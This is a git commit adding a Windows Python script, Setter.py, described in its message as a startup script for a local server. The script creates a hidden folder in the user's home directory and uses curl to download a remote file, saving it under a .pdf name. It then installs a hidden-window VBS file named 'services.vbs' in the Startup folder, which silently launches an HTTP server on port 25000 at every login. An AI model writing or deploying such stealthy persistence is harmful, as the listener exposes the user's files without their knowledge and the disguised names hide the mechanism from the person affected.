24aff3ec9e3abf77c2d2a3c58cd7753f28d10c7c
darwin08-os <harshgajjar7242@gmail.com>
2026-03-18 08:21:18 +0530

    Create startup script to run local server
    This script creates a hidden directory 'OST' in the user's home directory, downloads a file, and sets up a batch file and VBS script to run a local server at startup.

--- Setter.py
+++ Setter.py
@@ -1,1 +1,29 @@
+import os
+import sys
 
+user = os.getlogin()
+startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+
+os.chdir(f"C:/Users/{user}/")
+os.mkdir("OST")
+os.system("attrib +h OST")
+os.chdir(f"C:/Users/{user}/OST/")
+os.system("curl -o prac.pdf https://raw.githubusercontent.com/darwin08-os/Temp/main/prac.txt")
+
+bat_content = f'''@echo off \
+cd "C:/Users/{user}/OST/" \
+"{sys.executable}" -m http.server 25000'''
+
+vbs_content = fr'''
+set code = CreateObject("WScript.shell")
+code.Run "C:/Users/{user}/OST/xyz.bat",0,False
+'''
+
+with open("xyz.bat","w") as f:
+    f.write(bat_content)
+
+
+os.chdir(startup_path)
+
+with open("services.vbs","w") as f:
+    f.write(vbs_content)
